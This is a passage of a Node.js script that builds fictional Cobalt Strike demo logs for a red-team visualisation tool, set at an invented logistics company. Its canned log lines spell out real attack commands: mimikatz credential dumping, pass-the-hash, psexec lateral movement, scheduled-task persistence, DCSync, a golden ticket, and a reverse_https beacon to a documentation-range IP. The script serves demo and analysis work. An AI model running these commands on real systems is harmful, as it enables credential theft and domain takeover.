#!/usr/bin/env node
/**
 * Generates a synthetic Cobalt Strike style campaign for the RedEye demo.
 *
 * Everything here is fictional: the company (Halcyon Logistics), people, hosts, hashes and IPs
 * (RFC 5737 documentation ranges for the internet side, 10.20.0.0/16 inside). The output follows the
 * seed format read by applications/client/src/demo/db.ts.
 *
 * usage: node tools/generate-synthetic.mjs [out.json] [image-dir]
 */
import { createHash } from 'node:crypto';
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';

const outPath = process.argv[2] ?? 'applications/client/src/demo/seeds/synthetic.json';
const imageDir = process.argv[3] ?? 'applications/client/public/demo-images';
const SEED_ID = 'synthetic';

// ---------- deterministic randomness ----------
let state = 0x5eed1234;
const rand = () => {
	state |= 0;
	state = (state + 0x6d2b79f5) | 0;
	let t = Math.imul(state ^ (state >>> 15), 1 | state);
	t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
	return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
};
const int = (min, max) => Math.floor(rand() * (max - min + 1)) + min;
const pick = (list) => list[Math.floor(rand() * list.length)];
const hex = (n) => Array.from({ length: n }, () => int(0, 15).toString(16)).join('');
const uuid = () => `${hex(8)}-${hex(4)}-4${hex(3)}-${pick(['8', '9', 'a', 'b'])}${hex(3)}-${hex(12)}`;
const md5 = (s) => createHash('md5').update(s).digest('hex');

// ---------- time helpers ----------
const DAY0 = Date.UTC(2024, 2, 11, 13, 5, 0); // Mon 11 Mar 2024, 13:05 UTC
const MIN = 60_000;
const at = (day, hh, mm, ss = 0) => DAY0 + day * 86_400_000 + ((hh - 13) * 60 + (mm - 5)) * MIN + ss * 1000;
const iso = (t) => new Date(t).toISOString();
const pad = (n) => String(n).padStart(2, '0');
const stamp = (t) => {
	const d = new Date(t);
	return `${pad(d.getUTCMonth() + 1)}/${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} UTC`;
};
const folderDate = (t) => {
	const d = new Date(t);
	return `${String(d.getUTCFullYear()).slice(2)}${pad(d.getUTCMonth() + 1)}${pad(d.getUTCDate())}`;
};

// ---------- the fictional environment ----------
const DOMAIN = 'HALCYON';
const FQDN = 'halcyon.lan';
const operators = ['raven', 'falcon', 'wren'];

const seed = {
	servers: [],
	hosts: [],
	beacons: [],
	logs: [],
	commands: [],
	commandGroups: [],
	annotations: [],
	tags: [],
	links: [],
	operators: [],
	images: [],
	files: [],
};

const hostsById = {};
const addHost = (hostName, ip, os, osVersion, cobaltStrikeServer = false) => {
	const host = {
		id: hostName,
		hostName,
		displayName: null,
		hidden: false,
		cobaltStrikeServer,
		meta: cobaltStrikeServer
			? []
			: [{ id: uuid(), os, osVersion, ip, type: null, shape: 'circle', color: null }],
	};
	seed.hosts.push(host);
	hostsById[hostName] = host;
	return host;
};

const servers = {};
const addServer = (name, type, ip) => {
	const id = uuid();
	seed.servers.push({ id, name, displayName: null, hidden: false, meta: { id: uuid(), type, shape: 'hexagonUp', color: null } });
	addHost(name, ip, null, null, true);
	const faux = {
		id: `${name}-faux-beacon`,
		beaconName: name,
		displayName: null,
		hidden: false,
		hostId: name,
		serverId: id,
		operatorIds: [],
		meta: [],
	};
	seed.beacons.push(faux);
	servers[name] = { id, name, ip, type, faux };
	return servers[name];
};

addServer('TS-ALPHA', 'https', '198.51.100.24');
addServer('TS-BRAVO', 'dns', '203.0.113.77');

const net = {
	'WS-014': ['10.20.1.14', 'Windows', '10.0.19045'],
	'WS-022': ['10.20.1.22', 'Windows', '10.0.19045'],
	FS01: ['10.20.5.10', 'Windows Server', '10.0.17763'],
	SQL01: ['10.20.5.21', 'Windows Server', '10.0.17763'],
	DC01: ['10.20.0.5', 'Windows Server', '10.0.20348'],
	JUMP01: ['10.20.3.8', 'Windows Server', '10.0.17763'],
	WEB01: ['10.20.8.30', 'Windows Server', '10.0.17763'],
	'WS-031': ['10.20.1.31', 'Windows', '10.0.19045'],
	'WS-032': ['10.20.1.32', 'Windows', '10.0.19045'],
	'WS-033': ['10.20.1.33', 'Windows', '10.0.22631'],
	'WS-034': ['10.20.1.34', 'Windows', '10.0.19045'],
	'WS-035': ['10.20.1.35', 'Windows', '10.0.22631'],
};
for (const [name, [ip, os, version]] of Object.entries(net)) addHost(name, ip, os, version);

// ---------- log + beacon machinery ----------
const beaconState = {};
const lineCounters = {};

const addLog = (beacon, t, lineType, blob, commandId = null, logType = 'BEACON') => {
	const b = beaconState[beacon.id];
	const filepath = `${b.server.name}/${folderDate(t)}/${b.ip}/beacon_${beacon.beaconName}.log`;
	lineCounters[filepath] = (lineCounters[filepath] ?? 0) + 1;
	const log = {
		id: uuid(),
		blob,
		filepath,
		lineNumber: lineCounters[filepath],
		lineType,
		logType,
		dateTime: iso(t),
		beaconId: beacon.id,
		commandId,
	};
	seed.logs.push(log);
	b.lastTime = Math.max(b.lastTime, t);
	return log;
};

/**
 * Create a beacon. `parent` is the beacon that spawned it (smb/tcp chains), otherwise it calls home to `server`.
 */
const spawnBeacon = ({ host, server, user, process, pid, type, t, parent = null, viaCommand = null, operator }) => {
	const beaconName = String(int(100_000_000, 999_999_999));
	const h = hostsById[host];
	const ip = h.meta[0].ip;
	const beacon = {
		id: `${host}-${beaconName}`,
		beaconName,
		displayName: null,
		hidden: false,
		hostId: host,
		serverId: servers[server].id,
		operatorIds: [operator],
		meta: [],
	};
	seed.beacons.push(beacon);
	beaconState[beacon.id] = { server: servers[server], ip, lastTime: t, user, exited: null, commandCount: 0 };
	const external = parent ? ip : servers[server].ip === ip ? ip : ip;
	const meta = addLog(
		beacon,
		t,
		'METADATA',
		`${stamp(t)} [metadata] ${external} <- ${ip}; computer: ${host}; user: ${user}; process: ${process}; pid: ${pid}; os: ${h.meta[0].os}; version: ${h.meta[0].osVersion.slice(0, 4)}; build: ${h.meta[0].osVersion.split('.').pop()}; beacon arch: x64 (x64)`
	);
	beacon.meta.push({
		id: uuid(),
		pid,
		process,
		username: user,
		startTime: iso(t),
		endTime: null,
		ip,
		port: type === 'https' ? 443 : type === 'http' ? 80 : type === 'dns' ? 53 : 445,
		type,
		shape: 'circle',
		color: null,
		sourceId: meta.id,
	});
	seed.links.push({
		id: uuid(),
		name: null,
		startTime: iso(t),
		endTime: null,
		manual: false,
		originId: parent ? parent.id : servers[server].faux.id,
		destinationId: beacon.id,
		commandId: viaCommand ? viaCommand.id : null,
	});
	addLog(beacon, t + 2000, 'CHECKIN', `${stamp(t + 2000)} [checkin] host called home, sent: ${int(16, 120)} bytes`);
	return beacon;
};

/**
 * Issue a command on a beacon.
 * `tasks`: [{attack: ['T1059'], text: 'Tasked beacon to ...'}], `outputs`: strings (each becomes one output entry)
 */
const run = (beacon, t, operator, input, { tasks = [], outputs = [], failed = false, error = null, gap = null } = {}) => {
	const b = beaconState[beacon.id];
	const inputText = input.split(' ')[0];
	b.commandCount += 1;
	const id = `${beacon.beaconName}-${t}-${b.commandCount}`;
	const inputLog = addLog(beacon, t, 'INPUT', `${stamp(t)} [input] <${operator}> ${input}`);
	const attackIds = [];
	let tt = t;
	for (const task of tasks) {
		attackIds.push(...task.attack);
		addLog(beacon, tt, 'TASK', `${stamp(tt)} [task] <${task.attack.join(', ')}> ${task.text}`, id);
		tt += 1000;
	}
	tt += (gap ?? int(20, 70)) * 1000;
	addLog(beacon, tt - 1000, 'CHECKIN', `${stamp(tt - 1000)} [checkin] host called home, sent: ${int(40, 900)} bytes`);
	for (const output of outputs) {
		addLog(beacon, tt, 'OUTPUT', `${stamp(tt)} [output]\nreceived output:\n${output}\n`, id);
		tt += int(1, 6) * 1000;
	}
	if (error) addLog(beacon, tt, 'ERROR', `${stamp(tt)} [error] ${error}`, id);
	const command = {
		id,
		commandFailed: failed || !!error,
		attackIds: Array.from(new Set(attackIds)),
		inputId: inputLog.id,
		inputText,
		beaconId: beacon.id,
		operatorId: operator,
	};
	seed.commands.push(command);
	return command;
};

const exitBeacon = (beacon, t, operator) => {
	const cmd = run(beacon, t, operator, 'exit', { tasks: [{ attack: [], text: 'Tasked beacon to exit' }], gap: 5 });
	addLog(beacon, t + 8000, 'OUTPUT', `${stamp(t + 8000)} [output]\nbeacon exit.\n`, cmd.id);
	beaconState[beacon.id].exited = t + 8000;
	return cmd;
};

// ---------- canned command output ----------
const out = {
	getuid: (user) => `[*] You are ${user}`,
	whoamiGroups: (user, admin) => `
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
${admin ? 'BUILTIN\\Administrators                     Alias            S-1-5-32-544 Group used for deny only\n' : ''}NT AUTHORITY\\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
${DOMAIN}\\Domain Users                       Group            S-1-5-21-3141592653-5897932384-626433832-513 Mandatory group, Enabled by default, Enabled group
${DOMAIN}\\Shipping-Planners                  Group            S-1-5-21-3141592653-5897932384-626433832-1187 Mandatory group, Enabled by default, Enabled group
Mandatory Label\\Medium Mandatory Level     Label            S-1-16-8192`,
	ipconfig: (host, ip) => `
Windows IP Configuration

   Host Name . . . . . . . . . . . . : ${host}
   Primary Dns Suffix  . . . . . . . : ${FQDN}
   Node Type . . . . . . . . . . . . : Hybrid

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : ${FQDN}
   IPv4 Address. . . . . . . . . . . : ${ip}(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.20.0.1
   DNS Servers . . . . . . . . . . . : 10.20.0.5`,
	ps: (extra = []) =>
		[
			['[System Process]', 0, 0],
			['System', 0, 4],
			['smss.exe', 4, 372],
			['csrss.exe', 560, 640],
			['wininit.exe', 560, 712],
			['services.exe', 712, 788],
			['lsass.exe', 712, 804],
			['svchost.exe', 788, 924],
			['MsMpEng.exe', 788, 2716],
			['explorer.exe', 4412, 4500],
			['OUTLOOK.EXE', 4500, 6120],
			['Teams.exe', 4500, 7012],
			['chrome.exe', 4500, 8124],
			...extra,
		]
			.map(([name, ppid, pid]) => `${name}\t${ppid}\t${pid}`)
			.join('\n'),
	netView: () =>
		`Server Name             IP Address                       Platform  Version  Type   Comment
-----------             ----------                       --------  -------  ----   -------
DC01                    10.20.0.5                        500       10.0     PDC
FS01                    10.20.5.10                       500       10.0
SQL01                   10.20.5.21                       500       10.0
JUMP01                  10.20.3.8                        500       10.0
WEB01                   10.20.8.30                       500       10.0
WS-014                  10.20.1.14                       500       10.0
WS-022                  10.20.1.22                       500       10.0`,
	domainAdmins: () => `Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
adm.kowalski             Administrator            svc-backup
The command completed successfully.`,
	logonpasswords: (user, ntlm) => `
Authentication Id : 0 ; 3315764 (00000000:00329834)
Session           : Interactive from 2
User Name         : ${user}
Domain            : ${DOMAIN}
Logon Server      : DC01
Logon Time        : 3/11/2024 8:12:44 AM
SID               : S-1-5-21-3141592653-5897932384-626433832-${int(1100, 1900)}
	msv :
	 [00000003] Primary
	 * Username : ${user}
	 * Domain   : ${DOMAIN}
	 * NTLM     : ${ntlm}
	 * SHA1     : ${hex(40)}
	tspkg :
	wdigest :
	 * Username : ${user}
	 * Domain   : ${DOMAIN}
	 * Password : (null)
	kerberos :
	 * Username : ${user}
	 * Domain   : ${FQDN.toUpperCase()}
	 * Password : (null)`,
	hashdump: () =>
		['Administrator:500', 'Guest:501', 'DefaultAccount:503', 'WDAGUtilityAccount:504', 'helpdesk.local:1001']
			.map((u) => `${u}:aad3b435b51404eeaad3b435b51404ee:${hex(32)}:::`)
			.join('\n'),
	portscan: (hosts) =>
		hosts
			.flatMap(([ip, ports]) => ports.map((p) => `${ip}:${p}`))
			.join('\n') + `\n\nScanner module is complete`,
	ls: (dir, files) =>
		`${dir}\\*\nD     0      03/01/2024 09:14:02   .\nD     0      03/01/2024 09:14:02   ..\n` +
		files.map(([size, name]) => `F     ${size}   02/${int(10, 28)}/2024 ${int(8, 17)}:${pad(int(0, 59))}:${pad(int(0, 59))}   ${name}`).join('\n'),
	sqlDatabases: () => `name
--------------------------------
master
tempdb
model
msdb
ShipmentTracking
CustomerBilling
FleetTelemetry

(7 rows affected)`,
	sharpup: () => `=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===
	Name             : HalcyonTelemetryAgent
	DisplayName      : Halcyon Telemetry Agent
	PathName         : "C:\\Program Files\\Halcyon\\agent.exe"
	State            : Running
	StartMode        : Auto

=== Unattended Install Files ===
	C:\\Windows\\Panther\\Unattend.xml

[*] Completed Privesc Checks in 3 seconds`,
	dcsync: (ntlm) => `[DC] '${FQDN}' will be the domain
[DC] 'DC01.${FQDN}' will be the DC server
[DC] 'HALCYON\\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-3141592653-5897932384-626433832-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ${ntlm}`,
	golden: () => `User      : Administrator
Domain    : ${FQDN} (HALCYON)
SID       : S-1-5-21-3141592653-5897932384-626433832
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: ${hex(32)} - rc4_hmac_nt
Lifetime  : 3/12/2024 6:31:02 PM ; 3/10/2034 6:31:02 PM ; 3/10/2034 6:31:02 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ ${FQDN}' successfully submitted for current session`,
	jump: (target, method) => `Started service ${hex(7)} on ${target}\n[+] established link to child beacon via ${method}`,
	seatbelt: () => `====== AntiVirus ======
  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\\Windows Defender\\MsMpEng.exe

====== AppLocker ======
  [*] AppIDSvc service is Stopped
  [*] Applocker is not running because the AppIDSvc is not running

====== LAPS ======
  LAPS Enabled                   : False

====== PowerShell ======
  Installed CLR Versions         : 4.0.30319
  Script Block Logging Settings  : (disabled)`,
	schtasks: () => `SUCCESS: The scheduled task "HalcyonUpdateCheck" has successfully been created.`,
	tar: (file) => `a ${file}\nArchive written: C:\\ProgramData\\Microsoft\\Crypto\\${file.replace(/\\/g, '_')}.zip (48.2 MB)`,
};

const hashes = { svcHelpdesk: hex(32), admKowalski: hex(32), krbtgt: hex(32) };

// ---------- screenshots (SVG stand-ins for the binary JPGs the parser stored) ----------
mkdirSync(imageDir, { recursive: true });
const screenshot = (beacon, cmd, title, lines) => {
	const id = uuid();
	const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="800" viewBox="0 0 1280 800" font-family="Segoe UI, Arial, sans-serif">
<rect width="1280" height="800" fill="#1d4e7a"/>
<rect x="0" y="760" width="1280" height="40" fill="#202020"/>
<rect x="12" y="768" width="24" height="24" fill="#3a96dd"/>
<text x="1180" y="786" fill="#fff" font-size="13">${new Date(Number(cmd.id.split('-')[1])).toISOString().slice(11, 16)}</text>
<rect x="150" y="90" width="980" height="600" fill="#f3f3f3" stroke="#999"/>
<rect x="150" y="90" width="980" height="36" fill="#ffffff"/>
<text x="166" y="114" fill="#222" font-size="15">${title}</text>
${lines.map((l, i) => `<text x="180" y="${170 + i * 30}" fill="#333" font-size="16">${l}</text>`).join('\n')}
<text x="1110" y="114" fill="#666" font-size="16">✕</text>
</svg>`;
	const file = `${SEED_ID}-${id}.svg`;
	writeFileSync(join(imageDir, file), svg);
	seed.images.push({ id, fileType: 'svg', beaconId: beacon.id, url: `demo-images/${file}` });
};

// =====================================================================================
// The campaign
// =====================================================================================

// Day 0 — initial access via phishing on WS-014
const b1 = spawnBeacon({
	host: 'WS-014',
	server: 'TS-ALPHA',
	user: 'm.alvarez',
	process: 'rundll32.exe',
	pid: 6644,
	type: 'https',
	t: at(0, 13, 5),
	operator: 'raven',
});
let t = at(0, 13, 7);
const c_sleep = run(b1, t, 'raven', 'sleep 30 20', { tasks: [{ attack: ['T1029'], text: 'Tasked beacon to sleep for 30s (20% jitter)' }], gap: 2 });
t += 3 * MIN;
const c_getuid = run(b1, t, 'raven', 'getuid', { tasks: [{ attack: ['T1033'], text: 'Tasked beacon to get userid' }], outputs: [out.getuid(`${DOMAIN}\\m.alvarez`)] });
t += 2 * MIN;
const c_groups = run(b1, t, 'raven', 'shell whoami /groups', { tasks: [{ attack: ['T1059', 'T1033'], text: 'Tasked beacon to run: whoami /groups' }], outputs: [out.whoamiGroups('m.alvarez', true)] });
t += 4 * MIN;
const c_ipconfig = run(b1, t, 'raven', 'shell ipconfig /all', { tasks: [{ attack: ['T1059', 'T1016'], text: 'Tasked beacon to run: ipconfig /all' }], outputs: [out.ipconfig('WS-014', '10.20.1.14')] });
t += 3 * MIN;
const c_ps = run(b1, t, 'raven', 'ps', { tasks: [{ attack: ['T1057'], text: 'Tasked beacon to list processes' }], outputs: [out.ps([['rundll32.exe', 6120, 6644]])] });
t += 5 * MIN;
const c_shot1 = run(b1, t, 'raven', 'screenshot', { tasks: [{ attack: ['T1113', 'T1093'], text: 'Tasked beacon to take screenshot' }], outputs: [`received screenshot (184212 bytes)`] });
screenshot(b1, c_shot1, 'Outlook — Invoice_March_2024.docm', [
	'From: accounts@halcyon-billing.example',
	'Subject: URGENT: Updated invoice for March shipments',
	'Attachment: Invoice_March_2024.docm (Enable content to view)',
	'',
	'Hi Maria, please review the attached invoice before EOD.',
]);
t += 6 * MIN;
const c_netview = run(b1, t, 'raven', 'net view', { tasks: [{ attack: ['T1018', 'T1093'], text: 'Tasked beacon to run net view' }], outputs: [out.netView()], gap: 90 });
t += 8 * MIN;
const c_keylog = run(b1, t, 'raven', 'keylogger 4500 x64', { tasks: [{ attack: ['T1056.001', 'T1093'], text: 'Tasked beacon to log keystrokes in 4500 (x64)' }] });
addLog(b1, t + 30 * MIN, null, `${stamp(t + 30 * MIN)} [keystrokes] explorer.exe: \n[enter]teams[enter]Running a bit late for the 2pm{bksp}{bksp}{bksp}3pm sync[enter]`, c_keylog.id, 'KEYSTROKES');

// privilege escalation through a weak service on WS-014
t = at(0, 14, 2);
const c_sharpup1 = run(b1, t, 'raven', 'execute-assembly /opt/tools/SharpUp.exe audit', { tasks: [{ attack: ['T1059', 'T1093'], text: 'Tasked beacon to run .NET program: SharpUp.exe audit' }], outputs: [out.sharpup()], gap: 40 });
t += 9 * MIN;
const c_elevate = run(b1, t, 'raven', 'elevate svc-exe https-alpha', { tasks: [{ attack: ['T1543.003', 'T1569.002', 'T1093'], text: 'Tasked beacon to run windows/beacon_https/reverse_https (198.51.100.24:443) via Service Control Manager (\\\\127.0.0.1\\ADMIN$\\a42f5c1.exe)' }], outputs: ['Started service a42f5c1 on .'] });
const b2 = spawnBeacon({ host: 'WS-014', server: 'TS-ALPHA', user: 'SYSTEM *', process: 'a42f5c1.exe', pid: 7480, type: 'https', t: t + 70 * 1000, parent: null, viaCommand: c_elevate, operator: 'raven' });
t += 4 * MIN;
const c_logon1 = run(b2, t, 'raven', 'logonpasswords', { tasks: [{ attack: ['T1003', 'T1055', 'T1093'], text: "Tasked beacon to run mimikatz's sekurlsa::logonpasswords command" }], outputs: [out.logonpasswords('m.alvarez', hex(32)) + '\n' + out.logonpasswords('svc-helpdesk', hashes.svcHelpdesk)] });
t += 5 * MIN;
const c_hashdump = run(b2, t, 'raven', 'hashdump', { tasks: [{ attack: ['T1003.002', 'T1055', 'T1093'], text: 'Tasked beacon to dump hashes' }], outputs: [out.hashdump()] });
t += 6 * MIN;
const c_scan = run(b2, t, 'raven', 'portscan 10.20.0.0/22,10.20.5.0/24 445,1433,3389,5985 arp 1024', {
	tasks: [{ attack: ['T1046', 'T1093'], text: 'Tasked beacon to scan ports 445,1433,3389,5985 on 10.20.0.0/22,10.20.5.0/24' }],
	outputs: [
		out.portscan([
			['10.20.0.5', [445, 3389, 5985]],
			['10.20.5.10', [445, 3389]],
			['10.20.5.21', [445, 1433, 5985]],
			['10.20.3.8', [445, 3389, 5985]],
			['10.20.1.22', [445]],
		]),
	],
	gap: 300,
});
t += 12 * MIN;
const c_persist = run(b2, t, 'raven', 'shell schtasks /create /tn HalcyonUpdateCheck /tr C:\\ProgramData\\updchk.exe /sc onlogon /ru SYSTEM', { tasks: [{ attack: ['T1059', 'T1053.005'], text: 'Tasked beacon to run: schtasks /create /tn HalcyonUpdateCheck /tr C:\\ProgramData\\updchk.exe /sc onlogon /ru SYSTEM' }], outputs: [out.schtasks()] });
t += 3 * MIN;
const c_upload1 = run(b2, t, 'raven', 'upload /opt/payloads/updchk.exe', { tasks: [{ attack: ['T1105'], text: 'Tasked beacon to upload /opt/payloads/updchk.exe as C:\\ProgramData\\updchk.exe' }], gap: 15 });
seed.files.push({ id: uuid(), fileName: 'updchk.exe', location: 'C:\\ProgramData\\updchk.exe', dateTime: iso(t), md5: md5('updchk'), fileFlag: 'UPLOAD', beaconId: b2.id });

// lateral movement to the file server with the help desk account
t = at(0, 15, 20);
const c_pth = run(b2, t, 'raven', `pth ${DOMAIN}\\svc-helpdesk ${hashes.svcHelpdesk}`, { tasks: [{ attack: ['T1550.002', 'T1093'], text: `Tasked beacon to run mimikatz's sekurlsa::pth /user:svc-helpdesk /domain:${DOMAIN} /ntlm:${hashes.svcHelpdesk} /run:"%COMSPEC% /c echo 9f1c2e > \\\\.\\pipe\\7a1e3b" command` }], outputs: ['user\t: svc-helpdesk\ndomain\t: HALCYON\nprogram\t: C:\\Windows\\system32\\cmd.exe\nimpers.\t: no\nNTLM\t: ' + hashes.svcHelpdesk] });
t += 2 * MIN;
const c_jumpFs = run(b2, t, 'raven', 'jump psexec64 FS01 smb-alpha', { tasks: [{ attack: ['T1021.002', 'T1569.002', 'TA0008'], text: 'Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_4c) on FS01 via Service Control Manager (\\\\FS01\\ADMIN$\\3d81f0e.exe)' }], outputs: [out.jump('FS01', 'SMB pipe')] });
const b3 = spawnBeacon({ host: 'FS01', server: 'TS-ALPHA', user: 'SYSTEM *', process: '3d81f0e.exe', pid: 3312, type: 'smb', t: t + 50 * 1000, parent: b2, viaCommand: c_jumpFs, operator: 'raven' });
t += 4 * MIN;
const c_lsFin = run(b3, t, 'raven', 'ls D:\\Shares\\Finance', { tasks: [{ attack: ['T1083'], text: 'Tasked beacon to list files in D:\\Shares\\Finance' }], outputs: [out.ls('D:\\Shares\\Finance', [[48213, 'Q4_Forecast.xlsx'], [1288332, 'Vendor_Payments_2024.xlsx'], [9921, 'Bank_Routing_Numbers.txt'], [2048000, 'Payroll_Export_Feb.csv']])] });
t += 3 * MIN;
const c_download1 = run(b3, t, 'raven', 'download D:\\Shares\\Finance\\Vendor_Payments_2024.xlsx', { tasks: [{ attack: ['T1005', 'T1041'], text: 'Tasked beacon to download D:\\Shares\\Finance\\Vendor_Payments_2024.xlsx' }], outputs: ['started download of D:\\Shares\\Finance\\Vendor_Payments_2024.xlsx (1288332 bytes)\ndownload of Vendor_Payments_2024.xlsx is complete'], gap: 120 });
seed.files.push({ id: uuid(), fileName: 'Vendor_Payments_2024.xlsx', location: 'D:\\Shares\\Finance\\Vendor_Payments_2024.xlsx', dateTime: iso(t), md5: md5('vendor'), fileFlag: 'DOWNLOAD', beaconId: b3.id });
t += 5 * MIN;
const c_da = run(b3, t, 'raven', 'shell net group "Domain Admins" /domain', { tasks: [{ attack: ['T1059', 'T1069.002'], text: 'Tasked beacon to run: net group "Domain Admins" /domain' }], outputs: [out.domainAdmins()] });

// a second phish lands on WS-022 through the DNS server, then gets caught by Defender
t = at(0, 16, 40);
const b4 = spawnBeacon({ host: 'WS-022', server: 'TS-BRAVO', user: 't.nguyen', process: 'OneDriveUpdater.exe', pid: 9020, type: 'dns', t, operator: 'falcon' });
t += 3 * MIN;
const c_getuid4 = run(b4, t, 'falcon', 'getuid', { tasks: [{ attack: ['T1033'], text: 'Tasked beacon to get userid' }], outputs: [out.getuid(`${DOMAIN}\\t.nguyen`)], gap: 120 });
t += 6 * MIN;
const c_ps4 = run(b4, t, 'falcon', 'ps', { tasks: [{ attack: ['T1057'], text: 'Tasked beacon to list processes' }], outputs: [out.ps([['OneDriveUpdater.exe', 4500, 9020]])], gap: 180 });
t += 7 * MIN;
const c_shot4 = run(b4, t, 'falcon', 'screenshot', { tasks: [{ attack: ['T1113', 'T1093'], text: 'Tasked beacon to take screenshot' }], outputs: ['received screenshot (162004 bytes)'], gap: 200 });
screenshot(b4, c_shot4, 'Windows Security — Virus & threat protection', [
	'Threats found',
	'Microsoft Defender Antivirus found threats. Get details.',
	'',
	'Trojan:Win64/CobaltStrike.LDR!MTB  —  Severe',
	'Status: Quarantine pending',
]);
t += 5 * MIN;
const c_inject4 = run(b4, t, 'falcon', 'inject 4500 x64 dns-bravo', { tasks: [{ attack: ['T1055', 'T1093'], text: 'Tasked beacon to inject windows/beacon_dns/reverse_dns_txt (ns1.halcyon-cdn.example:53) into 4500 (x64)' }], error: 'could not open process 4500: [5] Access is denied.' });
t += 2 * MIN;
exitBeacon(b4, t, 'falcon');

// Day 1 — SQL server, domain admin, domain controller
t = at(1, 9, 15);
const c_jumpSql = run(b3, t, 'wren', 'jump winrm64 SQL01 smb-alpha', { tasks: [{ attack: ['T1021.006', 'TA0008'], text: 'Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_9a) on SQL01 via WinRM' }], outputs: [out.jump('SQL01', 'SMB pipe')] });
const b5 = spawnBeacon({ host: 'SQL01', server: 'TS-ALPHA', user: 'svc-helpdesk', process: 'wsmprovhost.exe', pid: 5128, type: 'smb', t: t + 40 * 1000, parent: b3, viaCommand: c_jumpSql, operator: 'wren' });
t += 5 * MIN;
const c_sql = run(b5, t, 'wren', 'shell sqlcmd -E -Q "SELECT name FROM sys.databases"', { tasks: [{ attack: ['T1059', 'T1213'], text: 'Tasked beacon to run: sqlcmd -E -Q "SELECT name FROM sys.databases"' }], outputs: [out.sqlDatabases()] });
t += 6 * MIN;
const c_seatbelt = run(b5, t, 'wren', 'execute-assembly /opt/tools/Seatbelt.exe -group=system', { tasks: [{ attack: ['T1082', 'T1093'], text: 'Tasked beacon to run .NET program: Seatbelt.exe -group=system' }], outputs: [out.seatbelt()], gap: 60 });
t += 7 * MIN;
const c_elevateSql = run(b5, t, 'wren', 'elevate svc-exe smb-alpha', { tasks: [{ attack: ['T1543.003', 'T1569.002', 'T1093'], text: 'Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_12) via Service Control Manager (\\\\127.0.0.1\\ADMIN$\\c7e1aa0.exe)' }], outputs: ['Started service c7e1aa0 on .', '[+] established link to child beacon: 10.20.5.21'] });
const b5s = spawnBeacon({ host: 'SQL01', server: 'TS-ALPHA', user: 'SYSTEM *', process: 'c7e1aa0.exe', pid: 6240, type: 'smb', t: t + 45 * 1000, parent: b5, viaCommand: c_elevateSql, operator: 'wren' });
t += 4 * MIN;
const c_logonSql = run(b5s, t, 'wren', 'logonpasswords', { tasks: [{ attack: ['T1003', 'T1055', 'T1093'], text: "Tasked beacon to run mimikatz's sekurlsa::logonpasswords command" }], outputs: [out.logonpasswords('adm.kowalski', hashes.admKowalski)] });
t += 3 * MIN;
exitBeacon(b5, t, 'wren');

// domain admin hash -> domain controller
t = at(1, 10, 40);
const c_pthDa = run(b2, t, 'raven', `pth ${DOMAIN}\\adm.kowalski ${hashes.admKowalski}`, { tasks: [{ attack: ['T1550.002', 'T1093'], text: `Tasked beacon to run mimikatz's sekurlsa::pth /user:adm.kowalski /domain:${DOMAIN} /ntlm:${hashes.admKowalski} command` }], outputs: ['user\t: adm.kowalski\ndomain\t: HALCYON\nimpers.\t: no\nNTLM\t: ' + hashes.admKowalski] });
t += 2 * MIN;
const c_jumpDc = run(b2, t, 'raven', 'jump psexec64 DC01 smb-alpha', { tasks: [{ attack: ['T1021.002', 'T1569.002', 'TA0008'], text: 'Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_e1) on DC01 via Service Control Manager (\\\\DC01\\ADMIN$\\f00d1e5.exe)' }], outputs: [out.jump('DC01', 'SMB pipe')] });
const b6 = spawnBeacon({ host: 'DC01', server: 'TS-ALPHA', user: 'SYSTEM *', process: 'f00d1e5.exe', pid: 2876, type: 'smb', t: t + 55 * 1000, parent: b2, viaCommand: c_jumpDc, operator: 'raven' });
t += 6 * MIN;
const c_dcsync = run(b6, t, 'raven', `dcsync ${FQDN} ${DOMAIN}\\krbtgt`, { tasks: [{ attack: ['T1003.006', 'T1093'], text: "Tasked beacon to run mimikatz's @lsadump::dcsync /domain:halcyon.lan /user:HALCYON\\krbtgt command" }], outputs: [out.dcsync(hashes.krbtgt)] });
t += 5 * MIN;
const c_golden = run(b6, t, 'raven', `mimikatz kerberos::golden /user:Administrator /domain:${FQDN} /sid:S-1-5-21-3141592653-5897932384-626433832 /krbtgt:${hashes.krbtgt} /ptt`, { tasks: [{ attack: ['T1558.001', 'T1093'], text: "Tasked beacon to run mimikatz's kerberos::golden /user:Administrator /ptt command" }], outputs: [out.golden()] });
t += 4 * MIN;
const c_shotDc = run(b6, t, 'raven', 'screenshot', { tasks: [{ attack: ['T1113', 'T1093'], text: 'Tasked beacon to take screenshot' }], outputs: ['received screenshot (201377 bytes)'] });
screenshot(b6, c_shotDc, 'Active Directory Users and Computers', [
	'halcyon.lan  ›  Users',
